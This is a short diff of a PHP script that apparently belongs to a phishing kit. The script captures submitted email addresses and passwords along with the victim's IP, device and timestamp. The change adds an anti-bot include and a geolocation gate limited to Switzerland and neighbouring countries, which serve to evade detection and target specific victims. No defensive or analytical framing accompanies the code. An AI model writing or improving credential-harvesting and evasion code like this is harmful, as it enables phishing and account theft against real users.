@@ -2,15 +2,12 @@
 session_start();
 include __DIR__ . '/settings.php';
 include __DIR__ . '/lang_main.php';
+include __DIR__ . '/antibot.php';
 
 header('Content-Type: application/json');
 
-function getIP() {
-    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $k) {
-        if (!empty($_SERVER[$k])) return trim(explode(',', $_SERVER[$k])[0]);
-    }
-    return 'N/A';
-}
+// Check geolocation - only allow Swiss and neighboring countries
+checkGeolocation();
 
 function parseDevice($ua) {
     if (preg_match('/iPhone/', $ua))      $device = '📱 iPhone';
@@ -41,7 +38,7 @@ function parseDevice($ua) {
 $step  = $_POST['step']  ?? '';
 $email = trim($_POST['email'] ?? '');
 $pass  = trim($_POST['pass']  ?? '');
-$ip    = getIP();
+$ip    = getClientIP();
 $ua    = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
 $dev   = parseDevice($ua);
 $dt    = date('d/m/Y à H:i') . ' UTC';
